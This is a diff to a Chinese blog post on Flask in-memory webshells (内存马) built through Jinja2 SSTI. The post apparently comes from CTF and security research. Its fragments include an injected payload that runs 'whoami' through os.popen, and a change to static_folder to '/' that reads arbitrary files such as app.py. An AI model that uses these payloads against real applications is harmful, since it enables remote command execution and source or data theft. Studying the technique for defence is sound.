@@ -3,10 +3,11 @@ title: Flask内存马详解
 toc: true
 categories:
   - 技术
-  - ctf
   - web
 date: 2025-05-07 21:10:12
 tags:
+  - python
+  - web安全
 ---
 
 本篇以jinja2 ssti视角研究Flask高版本内存马
@@ -188,7 +189,11 @@ Response.default_mimetype=__import__('os').popen('whoami').read()
 改static_folder读任意文件
 
 ```py
-app.static_url_path="/static";app.static_folder="/"   #然后static/app.py读源码
+app.static_url_path="/static"（访问时需要url加的，这个属性run的时候就确定了，运行时改没用）;app.static_folder="/"（这个运行时改有用）   #然后static/app.py读源码
+```
+
+```d
+pickle.loads的箱子里会传入app
 ```
 
 先写这么多，后面再更？
